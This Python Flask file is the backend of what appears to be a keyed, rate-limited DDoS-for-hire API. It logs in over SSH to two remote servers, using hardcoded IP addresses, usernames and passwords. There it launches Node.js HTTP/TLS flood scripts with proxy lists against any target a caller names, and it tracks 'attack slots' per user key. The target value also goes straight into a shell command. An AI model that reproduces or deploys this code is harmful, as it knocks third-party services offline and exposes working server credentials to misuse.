from flask import Flask, request, jsonify
import paramiko
from apscheduler.schedulers.background import BackgroundScheduler
from datetime import datetime

app = Flask(__name__)
scheduler = BackgroundScheduler()
attack_slots = 0
MAX_SLOTS = 10

ssh_servers = [
    {
        'hostname': '174.138.18.189',
        'port': 22,
        'username': 'root',
        'password': '6677ua'
    },
    {  
        'hostname': '20.255.59.18',
        'port': 22,
        'username': 'KyyStore',
        'password': '@zakigans12#'
    }
]

def get_user_info(key):
    with open('users.txt', 'r') as file:
        for line in file:
            line = line.strip()
            if line.startswith(key):
                user_info = line.split(':')
                if len(user_info) == 4:
                    return int(user_info[2]), int(user_info[3])
        return None, None

    return None, None

def key_exists(key):
    with open('users.txt', 'r') as file:
        for line in file:
            line = line.strip()
            if line.startswith(key + ':'):
                return True
    return False

def remove_expired_keys():
    with open('users.txt', 'r') as file:
        lines = file.readlines()

    with open('users.txt', 'w') as file:
        for line in lines:
            line = line.strip()
            if line:
                key, expired_date, max_duration, max_concurrent = line.split(':')
                if datetime.now() < datetime.strptime(expired_date, '%Y-%m-%d') and int(max_duration) > 0:
                    file.write(line + '\n')

@app.route('/api')
def execute_command():
    global attack_slots
    target = request.args.get('target')
    port = request.args.get('port')
    duration = request.args.get('duration')
    method = request.args.get('method')
    key = request.args.get('key')

    if not all([target, port, duration, method]) or key is None:
        return jsonify({'error': 'Missing required parameters.'}), 400

    if not key_exists(key):
        return jsonify({'error': 'Wrong key.'}), 400

    try:
        duration = int(duration)
    except ValueError:
        return jsonify({'error': 'Invalid duration parameter.'}), 400

    max_duration, max_concurrent = get_user_info(key)
    if max_duration is None or max_concurrent is None:
        return jsonify({'error': 'Invalid user info.'}), 400

    ssh_server_index = attack_slots % len(ssh_servers)
    ssh_server = ssh_servers[ssh_server_index]
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ssh_server['hostname'], port=ssh_server['port'], username=ssh_server['username'], password=ssh_server['password'])
    except paramiko.AuthenticationException:
        return jsonify({'result': 'Authentication failed.'}), 401
    except paramiko.SSHException as e:
        return jsonify({'result': f'Unable to establish SSH connection: {str(e)}'}), 500

    if attack_slots >= max_concurrent:
        return jsonify({'error': f'Your concurrents max is {max_concurrent}.'}), 400

    if method.upper() == 'SPAM':
        command = f"screen -dm timeout {duration} node OVER.js {target} 35 {duration}"
    elif method.upper() == 'FLOOD':
        command = f"screen -dm timeout {duration} node OVER2.js {target} {duration} 5 proxy.txt 45"
    elif method.upper() == 'TLS':
        command = f"screen -dm timeout {duration} node OVER3.js {target} {duration} 5 45 proxy.txt"
    elif method.upper() == 'TLSV1':
        command = f"screen -dm timeout {duration} node OVER4.js {target} {duration} 5 GET proxy.txt 45"
    elif method.upper() == 'FLOODV2':
        command = f"screen -dm timeout {duration} node OVER5.js {target} {duration} 45 5 proxy.txt"
    elif method.upper() == 'MIX':
        command = f"screen -dm timeout {duration} node OVER6.js {target} {duration} 45 5 proxy.txt"
    elif method.upper() == 'MIXV2':
        command = f"screen -dm timeout {duration} node Delak.js {target} {duration} 45 5 proxy.txt"
    elif method.upper() == 'STOP':
        command = f"pkill -f {target}"
    else:
        return jsonify({'error': 'Invalid method parameter.'}), 400

    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode('utf-8')

    ssh.close()

    def decrease_slots():
        global attack_slots
        attack_slots -= 1
        app.logger.info(f'Slot decreased. Slots in use: {attack_slots}')

        if attack_slots == 0:
            scheduler.remove_all_jobs()
            app.logger.info('All slots freed.')

    attack_slots += 1
    app.logger.info(f'Attack started on {target}. Slots in use: {attack_slots}')

    app.logger.info(f'Scheduling slot decrease for duration: {duration} seconds')
    scheduler.add_job(decrease_slots, 'interval', seconds=duration)

    return jsonify({'result': f'Attack started on {target}. Slots in use: {attack_slots}/{MAX_SLOTS}.'}), 200

if __name__ == '__main__':
    scheduler.start()
    remove_expired_keys()
    app.run(host='0.0.0.0', port=6666)
